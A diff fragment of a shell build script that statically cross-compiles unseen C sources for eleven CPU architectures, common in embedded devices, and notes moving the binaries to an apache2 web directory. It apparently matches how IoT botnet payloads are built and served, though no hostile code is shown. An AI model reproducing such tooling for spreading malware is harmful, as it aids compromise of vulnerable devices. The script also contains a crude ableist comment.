@@ -32,17 +32,17 @@ apt install gcc-i686-linux-gnu -y
 apt install gcc-arm-linux-gnueabihf -y
 apt install gcc-sh4-linux-gnu -y
 
-powerpc64-linux-gnu-gcc -static -pthread -DARCH="powerpc64" *.c -o powerpc64  
-mips-linux-gnu-gcc -static -pthread -DARCH="mips" *.c -o mips  
-mipsel-linux-gnu-gcc -static -pthread -DARCH="mipsel" *.c -o mipsel  
-sparc64-linux-gnu-gcc -static -pthread -DARCH="sparc" *.c -o sparc64  
-arm-linux-gnueabi-gcc -static -pthread -DARCH="arm" *.c -o arm  
-aarch64-linux-gnu-gcc -static -pthread -DARCH="aarch64" *.c -o aarch64  
-m68k-linux-gnu-gcc -static -pthread -DARCH="m68k" *.c -o m68k  
-i686-linux-gnu-gcc -static -pthread -DARCH="i686" *.c -o i686  
-arm-linux-gnueabihf-gcc -static -pthread -DARCH="armhf" *.c -o armhf  
-x86_64-linux-gnu-gcc -static -pthread -DARCH="x86_64" *.c -o x86_64  
-sh4-linux-gnu-gcc -static -pthread -DARCH="sh4" *.c -o sh4  
+powerpc64-linux-gnu-gcc -static -pthread *.c -o powerpc64  
+mips-linux-gnu-gcc -static -pthread *.c -o mips  
+mipsel-linux-gnu-gcc -static -pthread *.c -o mipsel  
+sparc64-linux-gnu-gcc -static -pthread *.c -o sparc  
+arm-linux-gnueabi-gcc -static -pthread *.c -o arm  
+aarch64-linux-gnu-gcc -static -pthread *.c -o aarch64  
+m68k-linux-gnu-gcc -static -pthread *.c -o m68k  
+i686-linux-gnu-gcc -static -pthread *.c -o i686  
+arm-linux-gnueabihf-gcc -static -pthread *.c -o armhf  
+x86_64-linux-gnu-gcc -static -pthread *.c -o x86_64  
+sh4-linux-gnu-gcc -static -pthread *.c -o sh4  
 # how retarded i am to forget -static earlier lmao (^)
 
 #move binaries to apache2 dir
